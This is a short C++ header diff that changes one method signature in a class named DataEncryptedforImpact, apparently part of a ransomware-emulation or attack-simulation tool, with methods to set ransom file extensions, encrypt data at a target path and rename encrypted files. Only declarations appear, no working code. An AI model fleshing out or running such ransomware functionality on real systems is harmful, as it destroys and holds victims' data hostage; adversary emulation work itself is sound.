@@ -23,7 +23,7 @@ namespace win {
 		DataEncryptedforImpact(): ext_List_({}) {};
 
 	public:
-		bool SetRansomExtension(std::vector<std::wstring>* ext_list);
+		bool SetRansomExtension(const std::vector<std::wstring>& ext_list);
 		DWORD RansomeData(const std::wstring& target_path);
 	private:
 		std::wstring ChangeFilenameExtensionForEncrypt(const std::wstring& target_file_path);
